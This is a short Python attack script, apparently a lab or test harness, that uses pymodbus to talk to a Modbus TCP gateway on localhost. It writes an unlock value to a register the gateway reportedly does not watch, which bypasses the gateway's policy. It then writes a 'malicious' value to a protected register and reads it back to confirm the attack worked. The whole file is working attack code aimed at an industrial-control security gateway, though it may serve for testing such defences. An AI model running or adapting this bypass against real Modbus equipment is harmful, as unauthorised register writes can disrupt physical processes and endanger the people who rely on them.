from pymodbus.client.sync import ModbusTcpClient
import time

def run_attack():
    # Connect to the Gateway
    client = ModbusTcpClient('127.0.0.1', port=5050)
    client.connect()

    print("--- PHASE 3: SEMANTIC INJECTION ATTACK ---")
    
    # THE ATTACK: Write to Register 21 directly (The Gateway only watches Reg 20!)
    # This is a "Policy Bypass" attack
    print("\n[ATTACK] Sending Bypass Unlock to Reg 21 (Hidden from Gateway)...")
    client.write_register(21, 1) 
    
    time.sleep(1)

    print("\n[ATTACK] Attempting Unauthorized Write to Reg 50...")
    client.write_register(50, 666) # Malicious value
    
    res = client.read_holding_registers(50, 1)
    print(f"Result (If 666, ATTACK SUCCESSFUL): {res.registers[0]}")

    client.close()

if __name__ == "__main__":
    run_attack()